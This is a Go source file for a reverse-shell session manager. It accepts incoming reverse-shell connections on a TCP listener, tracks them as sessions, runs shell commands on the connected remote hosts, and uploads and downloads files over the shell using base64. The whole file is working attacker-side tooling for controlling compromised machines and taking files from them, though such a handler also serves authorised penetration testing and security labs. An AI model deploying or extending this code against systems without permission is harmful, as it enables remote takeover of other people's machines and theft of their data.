// Package listener is a small Go reverse-shell session manager. It owns a TCP
// listener, a session registry, command execution and basic file transfer.
// It is intentionally not a C2: no persistence, no staging, no evasion.
package listener

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

const (
	DefaultReadTimeout = 30 * time.Second
	UploadChunkSize    = 32 * 1024
)

type Session struct {
	ID         string
	Conn       net.Conn
	RemoteAddr string
	CreatedAt  time.Time

	mu     sync.Mutex
	reader *bufio.Reader
}

type SessionInfo struct {
	ID         string    `json:"id"`
	RemoteAddr string    `json:"remote_addr"`
	CreatedAt  time.Time `json:"created_at"`
}

type Manager struct {
	mu          sync.Mutex
	ln          net.Listener
	sessions    map[string]*Session
	maxSessions int
}

func NewManager() *Manager {
	return &Manager{sessions: map[string]*Session{}, maxSessions: 16}
}

// Start listens on addr (e.g. "0.0.0.0:4444") and accepts reverse shells.
// It returns the actual listen address.
func (m *Manager) Start(addr string) (string, error) {
	addr = strings.TrimSpace(addr)
	if addr == "" {
		return "", fmt.Errorf("listen addr is required (e.g. 0.0.0.0:4444)")
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return "", err
	}
	m.mu.Lock()
	if m.ln != nil {
		m.mu.Unlock()
		_ = ln.Close()
		return "", errors.New("listener is already running")
	}
	m.ln = ln
	m.mu.Unlock()
	go m.acceptLoop(ln)
	return ln.Addr().String(), nil
}

func (m *Manager) acceptLoop(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		sess := &Session{ID: newID(), Conn: conn, RemoteAddr: conn.RemoteAddr().String(), CreatedAt: time.Now(), reader: bufio.NewReader(conn)}
		m.mu.Lock()
		if len(m.sessions) >= m.maxSessions {
			m.mu.Unlock()
			_ = conn.Close()
			continue
		}
		m.sessions[sess.ID] = sess
		m.mu.Unlock()
	}
}

// Stop closes the listener and every session.
func (m *Manager) Stop() error {
	m.mu.Lock()
	ln := m.ln
	m.ln = nil
	sessions := make([]*Session, 0, len(m.sessions))
	for _, s := range m.sessions {
		sessions = append(sessions, s)
	}
	m.sessions = map[string]*Session{}
	m.mu.Unlock()
	if ln != nil {
		_ = ln.Close()
	}
	for _, s := range sessions {
		_ = s.Conn.Close()
	}
	return nil
}

func (m *Manager) Sessions() []SessionInfo {
	m.mu.Lock()
	defer m.mu.Unlock()
	out := make([]SessionInfo, 0, len(m.sessions))
	for _, s := range m.sessions {
		out = append(out, SessionInfo{ID: s.ID, RemoteAddr: s.RemoteAddr, CreatedAt: s.CreatedAt})
	}
	return out
}

func (m *Manager) session(id string) (*Session, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	s, ok := m.sessions[id]
	if !ok {
		return nil, fmt.Errorf("session %s not found", id)
	}
	return s, nil
}

// Exec sends one command and reads until a unique marker is echoed. It is
// serialized per session. Commands should be non-interactive.
func (m *Manager) Exec(ctx context.Context, sessionID, command string) (string, error) {
	s, err := m.session(sessionID)
	if err != nil {
		return "", err
	}
	command = strings.TrimSpace(command)
	if command == "" {
		return "", fmt.Errorf("command is required")
	}
	s.mu.Lock()
	defer s.mu.Unlock()

	marker := "__CAPKIT_" + randomToken() + "__"
	if deadline, ok := ctx.Deadline(); ok {
		_ = s.Conn.SetDeadline(deadline)
	} else {
		_ = s.Conn.SetDeadline(time.Now().Add(DefaultReadTimeout))
	}
	defer s.Conn.SetDeadline(time.Time{})

	if _, err := io.WriteString(s.Conn, command+"; echo "+marker+"\n"); err != nil {
		return "", err
	}
	var out strings.Builder
	for {
		line, rerr := s.reader.ReadString('\n')
		if line != "" {
			out.WriteString(line)
			if strings.Contains(line, marker) {
				break
			}
		}
		if rerr != nil {
			return strings.TrimSpace(out.String()), rerr
		}
	}
	text := out.String()
	if idx := strings.Index(text, marker); idx >= 0 {
		text = text[:idx]
	}
	return strings.TrimRight(text, "\r\n"), nil
}

// Upload writes data to a remote path using chunked base64. POSIX shells only.
func (m *Manager) Upload(ctx context.Context, sessionID, path string, data []byte) (int, error) {
	if strings.TrimSpace(path) == "" {
		return 0, fmt.Errorf("path is required")
	}
	if len(data) == 0 {
		return 0, fmt.Errorf("refusing to write empty data")
	}
	q := quotePath(path)
	chunks := 0
	for offset := 0; offset < len(data); offset += UploadChunkSize {
		end := offset + UploadChunkSize
		if end > len(data) {
			end = len(data)
		}
		b64 := base64.StdEncoding.EncodeToString(data[offset:end])
		redir := ">>"
		if offset == 0 {
			redir = ">"
		}
		cmd := "printf '%s' '" + b64 + "' | base64 -d " + redir + " " + q
		if _, err := m.Exec(ctx, sessionID, cmd); err != nil {
			return chunks, err
		}
		chunks++
	}
	return chunks, nil
}

// Download reads a remote file as base64. POSIX shells only.
func (m *Manager) Download(ctx context.Context, sessionID, path string) ([]byte, error) {
	if strings.TrimSpace(path) == "" {
		return nil, fmt.Errorf("path is required")
	}
	out, err := m.Exec(ctx, sessionID, "base64 "+quotePath(path))
	if err != nil {
		return nil, err
	}
	clean := strings.Map(func(r rune) rune {
		if r == '\n' || r == '\r' || r == ' ' || r == '\t' {
			return -1
		}
		return r
	}, out)
	data, derr := base64.StdEncoding.DecodeString(clean)
	if derr != nil {
		return nil, fmt.Errorf("decode remote base64: %w", derr)
	}
	return data, nil
}

func quotePath(p string) string {
	return "'" + strings.ReplaceAll(p, "'", `'\''`) + "'"
}

func newID() string {
	return "sh_" + randomToken()
}

func randomToken() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
